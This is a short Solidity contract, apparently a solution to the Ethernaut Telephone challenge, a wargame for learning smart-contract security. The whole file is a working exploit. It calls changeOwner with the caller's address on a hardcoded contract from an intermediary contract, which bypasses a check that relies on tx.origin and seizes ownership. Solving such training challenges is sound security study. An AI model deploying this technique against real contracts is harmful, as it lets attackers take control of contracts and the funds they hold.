pragma solidity ^0.4.0;
contract Ethernaut_telephone_hack {

    function fallback() external payable {
        address contract_address = 0xe4734C8fc94A0A958f160123ba24FcdFa23280A7;

        contract_address.call.value(0).gas(25675)(bytes4(keccak256("changeOwner(address)")), msg.sender);
    }
}
